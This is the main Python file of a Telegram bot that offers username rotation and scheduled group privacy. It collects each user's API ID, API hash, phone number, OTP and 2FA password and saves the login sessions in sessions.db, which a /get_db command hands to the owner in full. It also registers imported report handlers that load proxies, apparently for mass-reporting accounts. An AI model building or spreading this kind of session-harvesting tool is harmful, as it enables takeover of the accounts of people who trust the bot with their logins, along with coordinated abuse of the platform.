import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.utils import executor

from config import BOT_TOKEN, ADMIN_ID
from states import LoginState
from db import init_db, init_admins, delete_session_by_user, add_admin, remove_admin, get_all_admins, is_admin
from session_manager import send_otp_code, confirm_otp_code, confirm_2fa_password
from username_changer import start_username_changer, stop_username_changer
from group_privater import schedule_group_privacy
from status import get_status_message
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from report_module import register_report_handlers, register_stop_handler, load_proxies_from_db
from report_username_module import register_username_report_handlers

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

init_db()
init_admins()
load_proxies_from_db()
register_username_report_handlers(dp)
register_report_handlers(dp)
register_stop_handler(dp)
print("✅ Username report handler registered")

otp_cache = {}
def generate_otp_keyboard(entered: str = ""):
    keyboard = []
    display_text = f"🔢 OTP: {entered or '____'}"
    keyboard.append([InlineKeyboardButton(display_text, callback_data="noop")])
    for row in [["1", "2", "3"], ["4", "5", "6"], ["7", "8", "9"]]:
        keyboard.append([InlineKeyboardButton(d, callback_data=f"digit_{d}") for d in row])
    keyboard.append([
        InlineKeyboardButton("0", callback_data="digit_0"),
        InlineKeyboardButton("⌫", callback_data="del"),
        InlineKeyboardButton("✅ Confirm", callback_data="submit")
    ])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

@dp.message_handler(commands=['start'])
async def start_cmd(msg: types.Message, state: FSMContext):
    from db import get_session
    existing = get_session(msg.from_user.id)
    if existing:
        return await msg.reply("✅ You're already logged in.\nUse /start_change to begin.")
    await msg.answer("👋 Welcome!\nSend your *API ID*:")
    await LoginState.waiting_for_api_id.set()

@dp.message_handler(state=LoginState.waiting_for_api_id)
async def get_api_id(msg: types.Message, state: FSMContext):
    try:
        api_id = int(msg.text.strip())
    except:
        return await msg.reply("❌ Invalid API ID. Please enter a number.")
    await state.update_data(api_id=api_id)
    await msg.answer("✅ API ID saved.\nNow send *API HASH*:")
    await LoginState.waiting_for_api_hash.set()

@dp.message_handler(state=LoginState.waiting_for_api_hash)
async def get_api_hash(msg: types.Message, state: FSMContext):
    await state.update_data(api_hash=msg.text.strip())
    await msg.answer("📱 Now send your *Phone Number* with country code:\nExample: +91XXXXXXXXXX")
    await LoginState.waiting_for_phone.set()

@dp.message_handler(state=LoginState.waiting_for_phone)
async def get_phone(msg: types.Message, state: FSMContext):
    await state.update_data(phone=msg.text.strip())
    await msg.answer("📤 Sending OTP...")
    data = await state.get_data()
    sent = await send_otp_code(
        user_id=msg.from_user.id,
        api_id=data['api_id'],
        api_hash=data['api_hash'],
        phone=data['phone']
    )
    if sent:
        otp_cache[msg.from_user.id] = []
        await msg.answer("🔢 Enter OTP using buttons:", reply_markup=generate_otp_keyboard())
        await LoginState.waiting_for_otp.set()
    else:
        await msg.answer("❌ OTP sending failed.")
        await state.finish()

@dp.callback_query_handler(lambda c: c.data.startswith(("digit_", "del", "submit")), state=LoginState.waiting_for_otp)
async def otp_buttons(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    data = callback.data
    digits = otp_cache.get(user_id, [])

    if data.startswith("digit_"):
        digit = data.split("_")[1]
        if len(digits) < 6:
            digits.append(digit)
    elif data == "del":
        if digits:
            digits.pop()
    elif data == "submit":
        code = "".join(digits)
        await callback.message.edit_text("🧠 Verifying OTP...")
        result = await confirm_otp_code(user_id, code, state, bot)
        return

    otp_cache[user_id] = digits
    await callback.message.edit_reply_markup(reply_markup=generate_otp_keyboard("".join(digits)))
    await callback.answer()

@dp.message_handler(state=LoginState.waiting_for_2fa)
async def get_2fa_password(msg: types.Message, state: FSMContext):
    password = msg.text.strip()
    await msg.answer("🔐 Verifying 2FA...")
    result = await confirm_2fa_password(msg.from_user.id, password, state, bot)
    if result:
        await msg.answer("✅ Login complete. Use /start_change.")
    else:
        await msg.answer("❌ Incorrect password or error occurred.")

@dp.message_handler(commands=['logout'])
async def handle_logout(message: types.Message):
    deleted = delete_session_by_user(message.from_user.id)
    if deleted:
        await message.reply("🧹 Session deleted. Use /start to log in again.")
    else:
        await message.reply("⚠️ No session found.")

@dp.message_handler(commands=['start_change'])
async def start_changing_username(msg: types.Message, state: FSMContext):
    await msg.reply("📛 Send your group @username (without @):")
    await state.set_state("group_username")

@dp.message_handler(state="group_username")
async def get_group_username(msg: types.Message, state: FSMContext):
    await state.update_data(group_username=msg.text.strip())
    await msg.reply("✏️ Now send the list of usernames to rotate, separated by commas (no spaces).")
    await state.set_state("usernames_list")

@dp.message_handler(state="usernames_list")
async def get_usernames_list(msg: types.Message, state: FSMContext):
    await state.update_data(usernames=[u.strip() for u in msg.text.strip().split(",")])
    await msg.reply("⏱️ Send time interval in seconds:")
    await state.set_state("change_interval")

@dp.message_handler(state="change_interval")
async def get_interval_and_start(msg: types.Message, state: FSMContext):
    try:
        interval = int(msg.text.strip())
        data = await state.get_data()
        result = await start_username_changer(
            user_id=msg.from_user.id,
            group_username=data['group_username'],
            usernames=data['usernames'],
            interval=interval
        )
        await msg.reply(result)
    except Exception as e:
        await msg.reply(f"❌ Error: {e}")
    finally:
        await state.finish()

@dp.message_handler(commands=['stop_change'])
async def stop_change(msg: types.Message):
    result = await stop_username_changer(msg.from_user.id)
    await msg.reply(result)

class PrivateState:
    waiting_for_group = "private_group"
    waiting_for_start = "private_start"
    waiting_for_end = "private_end"
    waiting_for_repeat = "private_repeat"

@dp.message_handler(commands=['private'])
async def start_private(msg: types.Message, state: FSMContext):
    await msg.reply("📛 Enter group @username (without @):")
    await state.set_state(PrivateState.waiting_for_group)

@dp.message_handler(state=PrivateState.waiting_for_group)
async def private_group(msg: types.Message, state: FSMContext):
    await state.update_data(group=msg.text.strip())
    await msg.reply("🕛 Enter START time (24hr, e.g., 00:00):")
    await state.set_state(PrivateState.waiting_for_start)

@dp.message_handler(state=PrivateState.waiting_for_start)
async def private_start(msg: types.Message, state: FSMContext):
    await state.update_data(start=msg.text.strip())
    await msg.reply("🕓 Enter END time (24hr, e.g., 04:00):")
    await state.set_state(PrivateState.waiting_for_end)

@dp.message_handler(state=PrivateState.waiting_for_end)
async def private_end(msg: types.Message, state: FSMContext):
    await state.update_data(end=msg.text.strip())
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("🔁 Yes, Repeat Daily", callback_data="repeat_yes")],
        [InlineKeyboardButton("❌ No, Only Once", callback_data="repeat_no")]
    ])
    await msg.reply("🔁 Do you want this to repeat daily?", reply_markup=keyboard)
    await state.set_state(PrivateState.waiting_for_repeat)

@dp.callback_query_handler(lambda c: c.data.startswith("repeat_"), state=PrivateState.waiting_for_repeat)
async def private_repeat(callback: types.CallbackQuery, state: FSMContext):
    repeat = callback.data == "repeat_yes"
    data = await state.get_data()
    result = await schedule_group_privacy(
        user_id=callback.from_user.id,
        group_username=data['group'],
        start_time_str=data['start'],
        end_time_str=data['end'],
        repeat=repeat,
        bot=callback.bot
    )
    await callback.message.edit_text(result)
    await callback.answer("✅ Done.")
    await state.finish()

@dp.message_handler(commands=['status'])
async def check_status(msg: types.Message):
    status_text, keyboard = get_status_message(msg.from_user.id)
    await msg.reply(status_text, reply_markup=keyboard, parse_mode="Markdown")

@dp.message_handler(commands=['admins'])
async def list_admins_cmd(msg: types.Message):
    if not is_admin(msg.from_user.id):
        return await msg.reply("❌ You are not authorized.")

    admins = get_all_admins()
    if ADMIN_ID not in admins:
        admins.insert(0, ADMIN_ID)

    msg_lines = [f"👑 Owner: `{ADMIN_ID}`"]
    if len(admins) > 1:
        msg_lines.append("\n👮‍♂️ Admins:")
        for uid in admins:
            if uid != ADMIN_ID:
                msg_lines.append(f"• `{uid}`")
    await msg.reply("\n".join(msg_lines), parse_mode="Markdown")

@dp.message_handler(commands=['get_db'])
async def send_db_to_admin(msg: types.Message):
    print("FROM USER ID:", msg.from_user.id)
    print("ADMIN_ID:", ADMIN_ID)

    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ Not authorized.")

    if os.path.exists("sessions.db"):
        await msg.reply_document(open("sessions.db", "rb"))
    else:
        await msg.reply("⚠️ sessions.db not found.")

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
